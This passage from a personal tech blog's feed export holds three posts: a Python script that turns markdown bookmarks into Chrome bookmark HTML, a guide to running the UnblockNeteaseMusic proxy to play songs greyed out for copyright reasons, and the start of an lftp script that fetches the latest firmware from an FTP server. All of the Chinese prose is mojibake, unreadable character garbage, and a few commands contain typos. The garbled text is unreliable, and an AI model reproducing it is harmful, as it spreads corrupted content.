<p>ä»¥ä¸ŠDOMç»“æ„ä¸­ï¼Œæ¯æ¡æ”¶è—éƒ½æœ‰ä¸€ä¸ª<code>&lt;A&gt;</code>æ ‡ç­¾ï¼Œè¯¥æ ‡ç­¾æœ‰ä¸€ä¸ªbase64å€¼å¯¹åº”çš„æ˜¯base64ç¼–ç åçš„å›¾æ ‡ï¼Œä¹Ÿå°±æ˜¯æ¯ä¸ªæ”¶è—çš„å›¾æ ‡ï¼Œè¿™ä¸ªä¸æ˜¯å¿…é¡»çš„ï¼Œä¸ºäº†æ–¹ä¾¿é˜…è¯»ï¼Œæˆ‘å°†å…¶åˆ é™¤äº†ï¼Œå¹¶ä¸å½±å“ã€‚</p>
<p>å¦‚æœä½¿ç”¨ä¸Šé¢çš„htmlæ–‡ä»¶å¯¼å…¥chromeçš„è¯ï¼Œæ˜¯ä¸‹é¢è¿™æ ·çš„ã€‚</p>
<p><img src="/assets/chrome/example.png" alt="chrome bookmark"></p>
<p>æ³¨æ„å…¶ä¸­ä¸¤ä¸ªæ”¶è—ï¼ˆè°·æ­Œç¿»è¯‘å’Œæˆ‘çš„åšå®¢ä¸»é¡µï¼‰æ²¡æœ‰æ˜¾ç¤ºæè¿°ä¿¡æ¯ï¼Œè¿™ä¸ªåœ¨chromeä¸­æ˜¯å…è®¸çš„ï¼Œå› ä¸ºæ ¹æ®å›¾æ ‡å°±èƒ½çŸ¥é“è¿™æ˜¯ä»€ä¹ˆç«™ç‚¹ã€‚</p>
<p>å¥½å•¦ï¼Œå¯¹æ¯”DOMç»“æ„å’Œåœ¨æ”¶è—å¤¹çš„å±•ç¤ºï¼Œä¸éš¾å‘ç°è§„å¾‹ï¼š</p>
<ol>
<li>æ‰€æœ‰æ”¶è—å¤¹ä¸­çš„æ–‡ä»¶å¤¹æ— è®ºåœ¨å“ªä¸€ä¸ªå±‚çº§ï¼Œéƒ½å¯¹åº”DOMä¸­çš„ä¸€ä¸ª<code>&lt;DT&gt;&lt;H3&gt;</code>æ ‡ç­¾</li>
<li><code>&lt;H3&gt;</code>æ ‡ç­¾åŒ…å«å±æ€§ï¼š<code>ADD_DATE</code>, <code>LAST_MODIFIED</code></li>
<li>æ”¶è—å¤¹ä¸­æ–‡ä»¶å¤¹å¯ä»¥åµŒå¥—</li>
<li>æ¯ä¸ª<code>&lt;DT&gt;&lt;H3&gt;</code>æ ‡ç­¾éƒ½ç´§éšç€ä¸€ç»„<code>&lt;DL&gt;&lt;p&gt;</code></li>
<li>æ¯ä¸ª<code>&lt;DL&gt;&lt;p&gt;</code>é‡Œéƒ½åŒ…å«ä¸€ä¸ªæ”¶è—åˆ—è¡¨</li>
<li>æ¯æ¡æ”¶è—éƒ½ä»¥<code>&lt;DT&gt;&lt;A&gt;</code>æ ‡ç­¾ç»„åˆï¼Œå¯¹åº”æ”¶è—çš„é“¾æ¥</li>
<li><code>&lt;A&gt;</code>æ ‡ç­¾åŒ…å«å±æ€§ï¼š<code>HREF</code>,<code>ADD_DATE</code>,<code>ICON</code></li>
</ol>
<p>åˆ°æ­¤å°±å®Œæˆäº†å¯¹æ”¶è—å¤¹çš„åˆ†æï¼Œä¸‹é¢å°±å¯ä»¥æŒ‰ç…§è¿™ä¸ªæ ¼å¼å°†markdownè½¬æ¢æˆç›¸åº”çš„html</p>
<h2 id="markdownè½¬html"><a href="#markdownè½¬html" class="headerlink" title="markdownè½¬html"></a>markdownè½¬html</h2><p>markdownæ–‡æ¡£æ ¼å¼å¾ˆç®€å•ï¼ŒåŒæ ·ä¸¾ä¾‹è¯´æ˜ï¼Œä¸‹é¢æ˜¯ç”¨markdownæ ¼å¼ç¼–å†™çš„æ”¶è—å¤¹ã€‚</p>
<pre><code class="md"># æ”¶è—å¤¹(Favorites)

## å¸¸ç”¨

- [è°·æ­Œç¿»è¯‘](http://translate.google.cn/)
- [litreily](http://www.litreily.top/)
- [Notes](https://litreily.gitbook.io/notes/content/)
- [smslit](http://www.smslit.top/)
- [github](https://github.com/)
- [coding](https://coding.net/user)

## è®ºå›(forum)

- [Coding åšå®¢](https://blog.coding.net/)
- [å›¾çµç¤¾åŒº](http://www.ituring.com.cn/)
- [ç”µå­å‘çƒ§å‹](http://www.elecfans.com/)

## ç¼–ç¨‹(Programming)

### ç®—æ³•(Algorithm)

- [Acmä¹‹å®¶](http://www.acmerblog.com/)
- [å„å¤§OJé¢˜ç›®åˆ†ç±»](http://www.pythontip.com/acm/problemCategory)

### linux

- [linux - Elixir - Free Electrons](http://elixir.free-electrons.com/linux/latest/source)
</code></pre>
<p>æˆ‘ä»¬ä½¿ç”¨Pythonå¯¹å…¶é€è¡Œè¯»å–å¤„ç†ï¼Œå¤„ç†ç­–ç•¥å¦‚ä¸‹ï¼š</p>
<ol>
<li>æ–°å»ºhtmlæ–‡ä»¶favorites.htmlï¼Œæ·»åŠ HTMLå¤´éƒ¨ä¿¡æ¯</li>
<li>è·å–å½“å‰ç³»ç»Ÿæ—¶é—´ä½œä¸ºæ”¶è—å¤¹ä¸­æ‰€æœ‰çš„<code>LAST_MODIFIED</code>å’Œ<code>ADD_DATE</code></li>
<li>å°†æ‰€æœ‰ä»¥<code>#</code>å¼€å¤´çš„è§†ä¸ºæ–‡ä»¶å¤¹ï¼Œæ·»åŠ <code>&lt;DT&gt;&lt;H3&gt;</code>æ ‡ç­¾ï¼Œè®¾ç½®æ—¶é—´æˆ³å’Œæ–‡ä»¶å¤¹åç§°</li>
<li>åœ¨<code>&lt;DT&gt;&lt;H3&gt;</code>æ ‡ç­¾åç´§è·Ÿ<code>&lt;DL&gt;&lt;p&gt;</code>æ ‡ç­¾</li>
<li>å°†æ‰€æœ‰é“¾æ¥æ›¿æ¢ä¸º<code>&lt;DT&gt;&lt;A&gt;</code>æ ¼å¼ï¼Œè¿™ä¸ªéœ€è¦ç”¨åˆ°pythonçš„æ­£åˆ™åŒ¹é…å’Œæ›¿æ¢ï¼Œéå¸¸æ–¹ä¾¿</li>
<li>åœ¨åˆé€‚çš„ä½ç½®æ·»åŠ <code>&lt;/DL&gt;&lt;p&gt;</code>æ ‡ç­¾ï¼Œç”¨ä»¥å°è£…<code>&lt;DL&gt;&lt;p&gt;</code></li>
</ol>
<p>ä½¿ç”¨è¯¥ç­–ç•¥ç¼–å†™çš„Pythonè„šæœ¬å¦‚ä¸‹ï¼š</p>
<pre><code class="python">#!/usr/bin/env python3
# -*- coding:utf-8 -*-
# convert markdown to chrome bookmarks
# @author: litreily
# @date: 2020-04-25

import sys
import time
import re


TIMESTAMP = int(time.time())

HTML_HEAD = &quot;&quot;&quot;\
&lt;!DOCTYPE NETSCAPE-Bookmark&gt;
&lt;!-- This is an automatically generated file.
     It will be read and overwritten.
     DO NOT EDIT! --&gt;
&lt;META HTTP-EQUIV=&quot;Content-Type&quot; CONTENT=&quot;text/html; charset=UTF-8&quot;&gt;
&lt;TITLE&gt;Bookmarks&lt;/TITLE&gt;
&lt;H1&gt;Bookmarks&lt;/H1&gt;
&lt;DL&gt;&lt;p&gt;
&quot;&quot;&quot;.format(TIMESTAMP)
HTML_END = &quot;&quot;&quot;&lt;/DL&gt;&lt;p&gt;\n&quot;&quot;&quot;

GROUP_HEAD = &quot;&quot;&quot;\t&lt;DT&gt;&lt;H3 ADD_DATE=&quot;{ts}&quot; LAST_MODIFIED=&quot;{ts}&quot;&gt;{title}&lt;/H3&gt;
\t&lt;DL&gt;&lt;p&gt;
&quot;&quot;&quot;
GROUP_END = &quot;\t&lt;/DL&gt;&lt;p&gt;\n&quot;

MASK = &quot;&quot;&quot;\t&lt;DT&gt;\
&lt;A HREF=&quot;{link}&quot; ADD_DATE=&quot;{ts}&quot; ICON=&quot;data:image/png;base64,{icon}&quot;&gt;{title}&lt;/A&gt;
&quot;&quot;&quot;


def main(input):
    with open(input, &#39;r&#39;) as f:
        lists = f.readlines()

    # open html file to write into
    output = open(&#39;favorites.html&#39;, &#39;w&#39;)
    output.write(HTML_HEAD)

    group_re = re.compile(r&#39;^(#+) +(.*)$&#39;) # eg. ## network
    mask_re = re.compile(r&#39;\[(.*)\]\((.*)\)&#39;) # eg. [baidu](https://www.baidu.com)

    pre_H_level = 0 # previous Header level, H2 or H3 or ...
    for line in lists:
        line = line.strip()

        m = mask_re.search(line)
        if m:
            # find link
            output.write(MASK.format(link=m.group(2), ts=TIMESTAMP, icon=None, title=m.group(1)))
        else:
            m = group_re.search(line)
            if m:
                # find header
                cur_H_level = len(m.group(1)) # current Header level
                if cur_H_level &lt;= pre_H_level:
                    for _ in range(pre_H_level - cur_H_level + 1):
                        output.write(GROUP_END)
                pre_H_level = cur_H_level
                output.write(GROUP_HEAD.format(ts=TIMESTAMP, title=m.group(2)))
    output.write(HTML_END)

if __name__ == &quot;__main__&quot;:
    if len(sys.argv) &lt; 2:
        print(&#39;No input files.&#39;)
        sys.exit(1)
    main(sys.argv[1])
</code></pre>
<p>è¿™ä¸ªè„šæœ¬å”¯ä¸€éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼šä»€ä¹ˆæ—¶å€™æ·»åŠ <code>&lt;DL&gt;&lt;p&gt;</code>å¯¹åº”çš„<code>&lt;/DL&gt;&lt;p&gt;</code>é—­åˆæ ‡ç­¾ï¼Ÿå¦‚æœåœ¨é”™è¯¯ä½ç½®æ·»åŠ äº†æˆ–è€…æ˜¯æ²¡æ·»åŠ ï¼Œéƒ½ä¼šå¯¼è‡´æ”¶è—å¤¹åµŒå¥—é¡ºåºé”™ä¹±ã€‚</p>
<p>å¯¹æ­¤æˆ‘çš„æ€è·¯æ˜¯ï¼šå¯¹æ¯”å‰åä¸¤æ¬¡markdownä¸­è¯»å–åˆ°çš„HEADERå±‚çº§ï¼Œæ¯”å¦‚H2å¯¹åº”2ï¼ŒH3å¯¹åº”3. å‰ä¸€æ¬¡<code>pre_H_level</code>ï¼Œå½“å‰<code>cur_H_level</code>ï¼Œå¦‚æœ<code>cur_H_level</code> &lt;= <code>pre_H_level</code>å°±éœ€è¦æ·»åŠ ï¼Œè€Œä¸”æ·»åŠ ä¸ªæ•°ç­‰äºå‰åä¸¤æ•°ä¹‹å·®åŠ 1.</p>
<p>ä¸¾ä¾‹è¯´æ˜ï¼š</p>
<pre><code class="md">## H2_1
...
### H3        # pre: H2, cur: H3. cur &gt; pre, ä¸åŠ 
...
## H2_2       # pre: H3, cur: H2, cur &lt; pre, åŠ (3-2+1)=2æ¬¡
...
## H2_3       # pre: H2, cur: H2, cur = pre, åŠ (2-2+1)=1æ¬¡
</code></pre>
<p>å½“ç„¶ï¼Œè¿™ç§åšæ³•çš„å‰ææ˜¯markdownç¬¦åˆè¯­æ³•è¦æ±‚ã€‚</p>
<h2 id="å¯¼å…¥chrome"><a href="#å¯¼å…¥chrome" class="headerlink" title="å¯¼å…¥chrome"></a>å¯¼å…¥chrome</h2><p>ä½¿ç”¨ä»¥ä¸Šè„šæœ¬å°†markdownè½¬æ¢ä¸ºhtml</p>
<pre><code class="sh">./md2bm test.md
</code></pre>
<pre><code class="html">&lt;!DOCTYPE NETSCAPE-Bookmark&gt;
&lt;!-- This is an automatically generated file.
     It will be read and overwritten.
     DO NOT EDIT! --&gt;
&lt;META HTTP-EQUIV=&quot;Content-Type&quot; CONTENT=&quot;text/html; charset=UTF-8&quot;&gt;
&lt;TITLE&gt;Bookmarks&lt;/TITLE&gt;
&lt;H1&gt;Bookmarks&lt;/H1&gt;
&lt;DL&gt;&lt;p&gt;
    &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1588501602&quot; LAST_MODIFIED=&quot;1588501602&quot;&gt;æ”¶è—å¤¹(Favorites)&lt;/H3&gt;
    &lt;DL&gt;&lt;p&gt;
    &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1588501602&quot; LAST_MODIFIED=&quot;1588501602&quot;&gt;å¸¸ç”¨&lt;/H3&gt;
    &lt;DL&gt;&lt;p&gt;
    &lt;DT&gt;&lt;A HREF=&quot;http://translate.google.cn/&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;è°·æ­Œç¿»è¯‘&lt;/A&gt;
    &lt;DT&gt;&lt;A HREF=&quot;http://www.litreily.top/&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;litreily&lt;/A&gt;
    &lt;DT&gt;&lt;A HREF=&quot;https://litreily.gitbook.io/notes/content/&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;Notes&lt;/A&gt;
    &lt;DT&gt;&lt;A HREF=&quot;http://www.smslit.top/&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;smslit&lt;/A&gt;
    &lt;DT&gt;&lt;A HREF=&quot;https://github.com/&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;github&lt;/A&gt;
    &lt;DT&gt;&lt;A HREF=&quot;https://coding.net/user&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;coding&lt;/A&gt;
    &lt;/DL&gt;&lt;p&gt;
    &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1588501602&quot; LAST_MODIFIED=&quot;1588501602&quot;&gt;è®ºå›(forum)&lt;/H3&gt;
    &lt;DL&gt;&lt;p&gt;
    &lt;DT&gt;&lt;A HREF=&quot;https://blog.coding.net/&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;Coding åšå®¢&lt;/A&gt;
    &lt;DT&gt;&lt;A HREF=&quot;http://www.ituring.com.cn/&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;å›¾çµç¤¾åŒº&lt;/A&gt;
    &lt;DT&gt;&lt;A HREF=&quot;http://www.elecfans.com/&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;ç”µå­å‘çƒ§å‹&lt;/A&gt;
    &lt;/DL&gt;&lt;p&gt;
    &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1588501602&quot; LAST_MODIFIED=&quot;1588501602&quot;&gt;ç¼–ç¨‹(Programming)&lt;/H3&gt;
    &lt;DL&gt;&lt;p&gt;
    &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1588501602&quot; LAST_MODIFIED=&quot;1588501602&quot;&gt;ç®—æ³•(Algorithm)&lt;/H3&gt;
    &lt;DL&gt;&lt;p&gt;
    &lt;DT&gt;&lt;A HREF=&quot;http://www.acmerblog.com/&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;Acmä¹‹å®¶&lt;/A&gt;
    &lt;DT&gt;&lt;A HREF=&quot;http://www.pythontip.com/acm/problemCategory&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;å„å¤§OJé¢˜ç›®åˆ†ç±»&lt;/A&gt;
    &lt;/DL&gt;&lt;p&gt;
    &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1588501602&quot; LAST_MODIFIED=&quot;1588501602&quot;&gt;linux&lt;/H3&gt;
    &lt;DL&gt;&lt;p&gt;
    &lt;DT&gt;&lt;A HREF=&quot;http://elixir.free-electrons.com/linux/latest/source&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;linux - Elixir - Free Electrons&lt;/A&gt;
&lt;/DL&gt;&lt;p&gt;
</code></pre>
<p>æœ€åå¯¼å…¥Chromeçœ‹ä¸‹ï¼ŒChromeä¼šæ·»åŠ ä¸€ä¸ªæ–°çš„æ–‡ä»¶å¤¹<strong>å·²å¯¼å…¥</strong>ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå­æ–‡ä»¶å¤¹æ‹–å‡ºæ¥å°±okäº†ï¼Œå†çœ‹çœ‹å›¾æ ‡ï¼Œå¦‚æœæœ€è¿‘æœ‰è®¿é—®è¿‡ï¼Œå…¶å®ä¸åŠ iconçš„base64ä¿¡æ¯ä¹Ÿæ˜¯å¯ä»¥æ˜¾ç¤ºå‡ºæ¥çš„ï¼Œå°±ç®—ç°åœ¨æ²¡æœ‰ï¼Œä»¥ååªè¦è®¿é—®è¿‡ä¸€æ¬¡å°±ä¼šè‡ªåŠ¨æ›´æ–°ï¼Œè¿™ç‚¹å€’æ˜¯æœ‰ç‚¹åƒäº¤æ¢æœºçš„å­¦ä¹ æœºåˆ¶ã€‚</p>
<p><img src="/assets/chrome/favorite.png" alt="favorites"></p>
<h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>è¿™ä¸ªè„šæœ¬ä¹Ÿå·²ç»æ›´æ–°åˆ°äº†<a href="https://github.com/Litreily/Python-scripts/blob/master/md2bm/mb2bm.py" target="_blank" rel="noopener">GitHub Litreily/Python-scripts</a>ï¼Œæ¬¢è¿æœ‰éœ€è¦çš„å°ä¼™ä¼´ä»¬ä½¿ç”¨ã€‚</p>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> markdown </tag>
            
            <tag> chrome </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[è§£é”ç½‘æ˜“äº‘éŸ³ä¹ç°è‰²æ— ç‰ˆæƒæ­Œæ›²]]></title>
      <url>https://www.litreily.top/2020/05/03/netease/</url>
      <content type="html"><![CDATA[<p>ç”±äºç‰ˆæƒä¹‹äº‰ï¼Œç½‘æ˜“äº‘çš„å¾ˆå¤šæ­Œæ›²éƒ½ç°æ‰å¹¶ä¸”æ— æ³•æ’­æ”¾äº†ï¼Œæƒ³è¦ä½¿å…¶å¯ä»¥æ’­æ”¾è¿˜æ˜¯æœ‰åŠæ³•çš„ï¼Œä¸‡èƒ½çš„Googleå’ŒGithubè®©æˆ‘æ‰¾åˆ°äº†<a href="https://github.com/nondanee/UnblockNeteaseMusic" target="_blank" rel="noopener">ç­”æ¡ˆ</a>ï¼Œç›´æ¥ä¸Šäº«ç”¨æ–¹æ³•å§ã€‚</p>
<h2 id="å‰ææ¡ä»¶"><a href="#å‰ææ¡ä»¶" class="headerlink" title="å‰ææ¡ä»¶"></a>å‰ææ¡ä»¶</h2><ul>
<li>ä¸€ä¸ªå¯ä»¥è¿œç¨‹è®¿é—®çš„æœåŠ¡å™¨ï¼Œæ¯”å¦‚vpsï¼Œé˜¿é‡Œäº‘ã€è…¾è®¯äº‘ã€...</li>
<li>å¦‚æœæ²¡æœ‰æœåŠ¡å™¨ï¼Œåªèƒ½å¯»æ‰¾åˆ«äººæ­å»ºå¥½çš„æœåŠ¡</li>
</ul>
<h2 id="æ­å»ºæœåŠ¡"><a href="#æ­å»ºæœåŠ¡" class="headerlink" title="æ­å»ºæœåŠ¡"></a>æ­å»ºæœåŠ¡</h2><p>åœ¨æœåŠ¡å™¨ç«¯ï¼Œé¦–å…ˆå®‰è£…ä¾èµ–çš„å·¥å…·<code>npx</code>ï¼Œå¦‚æœæœ‰åˆ™å¿½ç•¥</p>
<pre><code class="zsh">sudo apt install npm
sudo npm i -g npx
</code></pre>
<p>ç„¶åcloneé¡¹ç›®UnblockNeteaseMusic.gitåˆ°æœ¬åœ°</p>
<pre><code class="zsh">git clone git@github.com:nondanee/UnblockNeteaseMusic.git
cd UnblockNeteaseMusic
</code></pre>
<p>æ¥ä¸‹æ¥æ˜¯è¿è¡ŒæœåŠ¡ï¼Œæœ‰å¥½å‡ ç§æ–¹å¼ï¼Œä¸‹é¢ä»‹ç»3ç§</p>
<h3 id="npxå¯åŠ¨"><a href="#npxå¯åŠ¨" class="headerlink" title="npxå¯åŠ¨"></a>npxå¯åŠ¨</h3><p>ç¬¬ä¸€ç§ï¼Œæœ€ç®€å•çš„æ˜¯ç›´æ¥ç”¨npxå¯åŠ¨ï¼Œé»˜è®¤ä»¥8080ç«¯å£æ‰“å¼€</p>
<pre><code class="zsh">npx @npndanee/unblockneteasemusic
</code></pre>
<h3 id="nodeå¯åŠ¨"><a href="#nodeå¯åŠ¨" class="headerlink" title="nodeå¯åŠ¨"></a>nodeå¯åŠ¨</h3><p>ç¬¬äºŒç§æ–¹å¼ï¼Œä½¿ç”¨node, <code>-p</code>å‚æ•°æŒ‡å®šç«¯å£</p>
<pre><code class="zsh">npde app.js -p 4321
</code></pre>
<h3 id="æ­å»ºç³»ç»ŸæœåŠ¡"><a href="#æ­å»ºç³»ç»ŸæœåŠ¡" class="headerlink" title="æ­å»ºç³»ç»ŸæœåŠ¡"></a>æ­å»ºç³»ç»ŸæœåŠ¡</h3><p>ç¬¬ä¸‰ç§ï¼Œä½¿ç”¨æœåŠ¡æ–¹å¼ï¼Œæ–¹ä¾¿ç®¡ç†å’ŒæŸ¥çœ‹çŠ¶æ€</p>
<pre><code class="zsh"># æ–°å»ºæœåŠ¡
# æ³¨æ„å¡«å†™çš„è·¯å¾„æ˜¯cloneçš„UnblockNeteaseMusicæ‰€åœ¨ç›®å½•
sudo cat &gt; /etc/systemd/system/UnblockNeteaseMusic.service &lt;&lt;EOF
[Unit]
Description=UnblockNeteaseMusic
After=network.target
Wants=network.target

[Service]
Type=simple
PIDFile=/var/run/UnblockNeteaseMusic.pid
WorkingDirectory=/home/litreily/UnblockNeteaseMusic
ExecStart=/home/litreily/UnblockNeteaseMusic/app.js -p 4321
RestartPreventExitStatus=23
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# æ·»åŠ app.jsçš„æ‰§è¡Œæƒé™ï¼Œä¸æ·»åŠ å¯èƒ½æ— æ³•å¯åŠ¨æœåŠ¡
sudo chmod a+x app.js

# å¯åŠ¨ã€åœæ­¢ã€é‡å¯ã€æŸ¥çœ‹æœåŠ¡
systemctl start UnblockNeteaseMusic.service
systemctl stop UnblockNeteaseMusic.service
systemctl restart UnblockNeteaseMusic.service
systemctl status UnblockNeteaseMusic.service
</code></pre>
<p>é™¤äº†è¿™ä¸‰ç§ä»¥å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨Dockerï¼Œå…·ä½“å‚è€ƒgithubæ–‡æ¡£å³å¯</p>
<h2 id="ä½¿ç”¨ä»£ç†"><a href="#ä½¿ç”¨ä»£ç†" class="headerlink" title="ä½¿ç”¨ä»£ç†"></a>ä½¿ç”¨ä»£ç†</h2><p>åœ¨æœåŠ¡å™¨ç«¯æ­å»ºå¥½äº†ä»£ç†ï¼Œå°±éœ€è¦åœ¨æˆ‘ä»¬çš„å®¢æˆ·ç«¯ä½¿ç”¨å®ƒå’¯ï¼Œåœ¨windowsä¸Šï¼Œç½‘æ˜“äº‘éŸ³ä¹ä¸ç®¡UWPåº”ç”¨è¿˜æ˜¯æ™®é€šå®‰è£…åº”ç”¨éƒ½æ˜¯ç›´æ¥è®¾ç½®ä»£ç†çš„ã€‚</p>
<p><img src="/assets/music/netease-proxy.png" alt="ç½‘æ˜“äº‘éŸ³ä¹ä»£ç†"></p>
<p>å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å…¶å®ƒå·¥å…·è®¾ç½®ä»£ç†ï¼Œæ¯”å¦‚å°é£æœºã€ç³»ç»Ÿä»£ç†ç­‰ç­‰ï¼Œå› ä¸ºè¿™ä¸ªä»£ç†å·²ç»å®ç°äº†å®Œæ•´çš„http/httpsæœåŠ¡ï¼Œæ‰€ä»¥ä¹Ÿæ˜¯å¯ä»¥ä½œä¸ºå…¨å±€ä»£ç†ä½¿ç”¨çš„ï¼Œä¸è¿‡æˆ‘å·²ç»ä½¿ç”¨å…¶å®ƒä»£ç†ç”¨äºç§‘å­¦ä¸Šç½‘ï¼Œæ‰€ä»¥å°±åªåœ¨ç½‘æ˜“äº‘é…ç½®ä¸‹ä»£ç†å°±å¥½äº†ã€‚</p>
<p>è¯¥å·¥å…·éå¸¸å¼ºå¤§ï¼Œä»£ç†é…ç½®å¥½åï¼Œæˆ‘çœ‹äº†ä¸‹ä¹‹å‰ç°æ‰çš„æ­Œæ›²ï¼Œç¡®å®å¯ä»¥æ­£å¸¸æ’­æ”¾äº†ï¼Œamazing!</p>
<p><img src="/assets/stickers/cheers.gif" alt="cheers"></p>
<p>è¯¥å·¥å…·ä¹Ÿé€‚ç”¨äºå…¶å®ƒç³»ç»Ÿå’Œç§»åŠ¨ç«¯ï¼Œæœ‰éœ€è¦çš„å¯ä»¥å°è¯•ä¸‹ã€‚æœ€åæé†’ä¸‹å„ä½ï¼Œæœ‰èƒ½åŠ›çš„è¿˜æ˜¯æ”¯æŒæ­£ç‰ˆï¼ŒåŒæ—¶ä¹Ÿè¯·ä½è°ƒä½¿ç”¨ã€‚</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul>
<li><a href="https://github.com/nondanee/UnblockNeteaseMusic" target="_blank" rel="noopener">Github UnblockNeteaseMusic</a></li>
<li><a href="https://www.nange.cn/unlock-netease-music.html" target="_blank" rel="noopener">è§£é”ç½‘æ˜“äº‘éŸ³ä¹ç°è‰²æ— ç‰ˆæƒæ­Œæ›²ï¼Œä½¿å…¶å˜ä¸ºæ­£å¸¸å¯å¬å¯ä¸‹è½½çŠ¶æ€</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Media </category>
            
        </categories>
        
        
        <tags>
            
            <tag> music </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[lftpè·å–FTP Serverç«¯æœ€æ–°æ–‡ä»¶]]></title>
      <url>https://www.litreily.top/2020/04/30/lftp_get/</url>
      <content type="html"><![CDATA[<p>æœ€è¿‘è§£ä¸€ä¸ªbugï¼Œè¦é¢‘ç¹ç¼–è¯‘å’Œçƒ§å½•FWï¼Œæ¯æ¬¡éƒ½è¦å°†imageä»è¿œç¨‹çš„FTP serveræ‰‹åŠ¨copyåˆ°æœ¬åœ°ï¼Œç„¶åä½¿ç”¨tftpè¿›è¡Œçƒ§å½•ï¼Œå®åœ¨ä¸èƒœå…¶çƒ¦ã€‚è™½ç„¶ä¸Šä¸€ç¯‡<a href="https://www.litreily.top/2020/04/27/tftp/">ç®€å•å®ç”¨çš„tftpçƒ§å½•imageè„šæœ¬</a>æé«˜äº†çƒ§å½•æ•ˆç‡ï¼Œä½†æ˜¯æ¯æ¬¡å°†imageæ‹·è´åˆ°æœ¬åœ°ä¹Ÿæ˜¯éº»çƒ¦ã€‚</p>
<p>è¿™æ¬¡ï¼Œæˆ‘ä¾æ—§æƒ³åˆ°äº†WSL, ä½¿ç”¨shellè„šæœ¬è¿˜æ˜¯æ›´åŠ æ–¹ä¾¿å¿«æ·ï¼Œæ€è·¯å¾ˆç®€å•ï¼Œæ£€æŸ¥serverç«¯çš„æœ€æ–°æ–‡ä»¶ï¼Œå¾—åˆ°æ–‡ä»¶ååä½¿ç”¨lftpä¸‹è½½åˆ°æœ¬åœ°ã€‚</p>
<h2 id="è·å–æœ€æ–°æ–‡ä»¶"><a href="#è·å–æœ€æ–°æ–‡ä»¶" class="headerlink" title="è·å–æœ€æ–°æ–‡ä»¶"></a>è·å–æœ€æ–°æ–‡ä»¶</h2><p>FTP Serveræ–‡ä»¶å­˜å‚¨æ–¹å¼æ˜¯å°†æ¯å¤©çš„æ–°æ•°æ®å½’æ¡£åˆ°ä»¥å½“æ—¥æ—¥æœŸå‘½åçš„æ–‡ä»¶å¤¹ä¸­ï¼Œå¦‚ä»Šå¤©<code>20200430</code></p>
<pre><code class="zsh">âœ  lftp -u &quot;username,password&quot; ftp://1.2.3.4
lftp username@1.2.3.4:~&gt; ls
04-27-20  02:03PM       &lt;DIR&gt;          20200427
04-29-20  05:36PM       &lt;DIR&gt;          20200429
04-30-20  01:11PM       &lt;DIR&gt;          20200430
lftp username@1.2.3.4:/&gt; cd 20200430
lftp username@1.2.3.4:/20200430&gt; ls
04-30-20  08:45AM             25165953 20200430084545-FW-V1.2.1.4.img
04-30-20  09:09AM             25165953 20200430090947-FW-V1.2.1.4.img
04-30-20  10:04AM             25165953 20200430100405-FW-V1.2.1.4.img
04-30-20  11:02AM             25165953 20200430110247-FW-V1.2.1.4.img
04-30-20  01:11PM             25165953 20200430131110-FW-V1.2.1.4.img
lftp username@1.2.3.4:/20200430&gt; exit
âœ  
</code></pre>
<p>æ‰€ä»¥è·å–å½“æ—¥æ–‡ä»¶åˆ—è¡¨æ—¶éœ€è¦å…ˆè¿›å…¥ç›®å½•ï¼Œç„¶ålså¹¶å°†ç»“æœå­˜åˆ°æœ¬åœ°tmpæ–‡ä»¶</p>
<pre><code class="zsh">dir=$(date &#39;+%Y%m%d&#39;)
lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF &gt; $tmpfile
    cd $dir
    ls
EOF
</code></pre>
<p>ç”±äºlsç»“æœé»˜è®¤ä»¥æ—¶é—´é¡ºåºæ’åºï¼Œæœ€æ–°æ–‡ä»¶åœ¨æœ€åä¸€è¡Œï¼Œè¿™å°±å¥½åŠäº†ï¼Œç»“åˆ<code>tail</code>å’Œ<code>awk</code>å°±å¯ä»¥å¾—åˆ°æœ€æ–°æ–‡ä»¶åã€‚</p>
<pre><code class="zsh">image=$(tail -1 $tmpfile |awk &#39;{print $4}&#39;)
</code></pre>
